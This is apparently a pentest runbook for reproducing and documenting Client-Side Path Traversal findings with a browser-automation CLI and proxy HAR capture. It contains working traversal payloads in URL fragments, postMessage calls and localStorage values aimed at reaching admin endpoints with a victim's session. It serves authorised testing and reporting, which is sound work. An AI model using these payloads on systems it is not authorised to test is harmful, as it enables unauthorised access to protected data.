# CSPT evidence runbook

How to reproduce and capture request-path evidence for a Client-Side Path
Traversal (CSPT) finding, so a confirmed report carries the proof the maintainer
asked for. This is the manual counterpart to the automated tests in
`tests/test_cspt_skill.py` — the tests guard the skill/fixtures/categorization in
CI; this runbook produces the live browser + proxy evidence a real finding needs
(which CI can't run).

The vulnerability and its confirmation both happen **in the browser**: the win
condition is the victim's browser sending a request to an *unintended* same-origin
path, carrying the victim's session. So the evidence is the **outbound request
path on the wire**, read off the Caido proxy / a HAR capture — not the response
body alone.

## Prerequisites

- `agent-browser` CLI (pre-installed in the Strix sandbox), which auto-routes
  through the Caido proxy via `http_proxy` / `https_proxy`. **Do not pass
  `--proxy`** — see the `agent_browser` skill.
- An authenticated session on the target (so requests carry ambient credentials),
  or one of the fixtures under `tests/fixtures/cspt/` served locally for a
  self-contained demo.

## Procedure

```bash
# 1. Load the page. Authenticate so subsequent requests carry a session.
agent-browser open <target>
agent-browser auth login <profile>          # or: state load ./auth.json

# 2. Start capturing traffic BEFORE triggering the sink.
agent-browser network har start

# 3a. BENIGN CONTROL — drive the source with a normal value first.
#     This establishes the intended request path for the side-by-side.
agent-browser open "<target>/#/orders/12345"
agent-browser wait --load networkidle
agent-browser network requests              # note the intended path, e.g. /api/orders/12345/detail

# 3b. TRAVERSAL — drive the same source with a crafted value.
agent-browser open "<target>/#/orders/..%2f..%2fadmin%2fkeys"
agent-browser wait --load networkidle
agent-browser network requests              # note the traversed path, e.g. /api/admin/keys

# 4. Stop the capture and keep the HAR as the primary artifact.
agent-browser network har stop /workspace/.agent-browser-screenshots/cspt.har

# 5. Optional visual proof if the traversed response changes the page.
agent-browser screenshot
```

For a `postMessage` source, replace step 3b with an eval that posts the crafted
message into the vulnerable listener:

```bash
cat <<'EOF' | agent-browser eval --stdin
window.postMessage({ path: "../../admin/keys" }, "*");
EOF
```

For a storage source, seed the value first, then reload:

```bash
agent-browser eval "localStorage.setItem('activeTenant', '../../admin')"
agent-browser open "<target>"
```

## Confirmation criteria

A finding is a real CSPT only when **all** of these hold, evidenced from the HAR:

1. **Traversed path on the wire** — the outbound request path is the traversed
   target (e.g. `/api/admin/keys`), not the intended one
   (`/api/orders/12345/detail`).
2. **Ambient credentials** — that request carried the victim's session
   (`Cookie` / `Authorization` header present; read it from the HAR entry).
3. **Benign control** — the same flow with a normal value hit the intended path.
   Show both, side by side.
4. **Reach** — the traversed endpoint returned data or performed an action the
   source value should not have been able to reach.

Do not exfiltrate real secrets — a status / length / shape delta against a
low-sensitivity sibling endpoint is enough to prove reach.

## Turning it into a report

File with `create_vulnerability_report`:

- `finding_class="client_side_path_traversal"` (**required** — separates it from
  server-side path traversal / LFI / RFI, which share CWE-22).
- `cwe="CWE-22"`, `title` prefixed `Client-Side Path Traversal`.
- `evidence` — the intended vs. traversed request paths from the HAR, with the
  credential header shown, plus the benign control, in fenced code blocks.

### Evidence block template

```
Intended (benign control):
  GET /api/orders/12345/detail
  Cookie: session=<redacted>
  → 200 OK  (own order)

Traversed (CSPT):
  GET /api/orders/../../admin/keys/detail
  → browser normalizes to: GET /api/admin/keys
  Cookie: session=<redacted>
  → 200 OK  (admin key material reachable via a low-priv user's fragment)
```

## Demoing against the bundled fixtures

The fixtures in `tests/fixtures/cspt/` are self-contained static pages. Serve the
directory and drive each one to see the positive/negative behavior without a real
target:

```bash
python -m http.server 8000 --directory tests/fixtures/cspt
agent-browser network har start
agent-browser open "http://localhost:8000/positive_direct.html#/orders/../../admin/keys"
agent-browser wait --load networkidle
agent-browser network requests     # observe the normalized /api/admin/keys request
```

The positive fixtures emit a traversed `/api/...` request; the negative fixtures
(`negative_validated.html`, `negative_safe_construction.html`) either reject the
input before the sink or keep the value out of the path entirely.
